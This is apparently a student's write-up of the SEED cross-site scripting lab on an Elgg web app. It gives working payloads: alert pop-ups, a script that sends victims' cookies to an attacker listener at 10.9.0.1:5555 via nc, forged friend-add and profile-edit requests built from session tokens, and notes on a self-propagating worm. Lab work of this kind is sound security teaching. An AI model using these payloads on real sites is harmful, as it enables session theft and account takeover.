# Lab 6 $-$ Cross-Site Scripting (XSS) Attack Lab on Elgg WebApp

---

## General Notes
### edit hosts
| .        | .                   |
| -------- | ------------------- |
| 10.9.0.5 | www.seed-server.com |
| 10.9.0.5 | www.example32a.com  |
| 10.9.0.5 | www.example32b.com  |
| 10.9.0.5 | www.example32c.com  |
| 10.9.0.5 | www.example60.com   |
| 10.9.0.5 | www.example70.com   |

- had a hard time making it work :(

### User in db
| UserName | Password    |
| -------- | ----------- |
| admin    | seedelgg    |
| alice    | seedalice   |
| boby     | seedboby    |
| charlie  | seedcharlie |
| samy     | seedsamy    |

---

# Task 1 $-$ Posting a Malicious Message to Display an Alert Window
- It's sufficient to embed an inline script with an alert in the brief description of the profile, so that whenever someone sees us will get the alert
  ```js
  // in the brief description
  hello <script>alert('ciao')</script>
  ```
---  
# Task 2 $-$ Posting a Malicious Message to Display Cookies
- just do it:
  `<script>alert(document.cookie);</script>`
---
# Task 3 $-$ Stealing Cookies from the Victim’s Machine
- make the script send the cookie to malicious server:
  ```javascript
  <script>
    document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >'); 
  </script>
  ```
- and then listen there: `nc -lknv 5555`
---
# Task 4 $-$ Becoming the Victim’s Friend
- figure out how a legitimate request works inspecting network
- craft malicious request:
  ```javascript
  <script type="text/javascript"> window.onload = function () {
  var Ajax=null;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // (1)
  var token="&__elgg_token="+elgg.security.token.__elgg_token; // (2) //Construct the HTTP request to add Samy as a friend.
  var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token; 
  Ajax=new XMLHttpRequest(); Ajax.open("GET", sendurl, true); Ajax.send(); //Create and send Ajax request to add friend
  }
  </script>
  ```
- once the victim will load the page it'll send the authenticated request to add user 59 as friend
---
# Task 5 $-$ Modifying the Victim’s Profile
- inspect legitimate request to edit profile and craft malicious one
  ```javascript
  <script type="text/javascript"> window.onload = function() {
  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts //and Security Token __elgg_token
  var userName="&name="+elgg.session.user.name;
  var guid="&guid="+elgg.session.user.guid;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;
  2
  //Construct the content of your url.
  var new_description = "Hello World!";
  var content=token+ts+guid+userName+"&description="+new_description; var samyGuid="59";
  var sendurl="http://www.seed-server.com/action/profile/edit";
  if(elgg.session.user.guid != samyGuid) { // avoid editing samy's about section (the attacker)
    //Create and send Ajax request to modify profile var Ajax=null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content); }
  }
  </script>
  ```
---
# Task 6 $-$ Writing a Self-Propagating XSS Worm
- basically make it copy itslef via dom API is the best approach (see [samy-worm](../lab6_XSS/solutions/samy-worm.html))
- also a link approach is valid, host the script somewhere, embed it with the script tag fetching the remote script and make the worm replciate the embedder script tag in the other victims
---
